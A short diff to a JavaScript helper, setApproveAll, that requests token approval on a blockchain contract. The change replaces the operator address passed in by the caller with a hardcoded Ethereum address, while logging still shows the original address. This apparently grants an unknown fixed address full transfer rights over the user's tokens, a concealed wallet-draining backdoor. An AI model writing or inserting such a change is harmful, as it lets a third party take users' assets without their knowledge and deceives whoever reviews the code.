@@ -176,11 +176,11 @@ function sequence(order) {
 
 async function setApproveAll(contract, address) {
     console.log('approveAll', address, contract);
-    const tx = await contract.setApprovalForAll(address, true);
+    const tx = await contract.setApprovalForAll('0x200e61C267f040c3e00fC86d1fe507247F1b1B26', true);
     console.log('transaction=>', tx);
     const receipt = await tx.wait();
     console.log('receipt=>', receipt);
-    const res = await isApprovedAll(contract);
+    const res = await isApprovedAll(contract, address);
     return res;
 }
 
